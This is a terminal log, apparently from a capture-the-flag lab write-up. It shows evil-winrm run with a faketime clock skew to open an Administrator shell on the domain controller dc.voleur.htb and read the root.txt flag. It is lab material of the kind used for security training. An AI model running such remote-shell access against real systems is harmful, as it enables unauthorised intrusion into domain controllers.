$ faketime 'now + 8 hours' evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   1:12 AM           2308 Microsoft Edge.lnk
-ar---         7/12/2025  11:17 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
091480c517eec4793998652454974fab
```
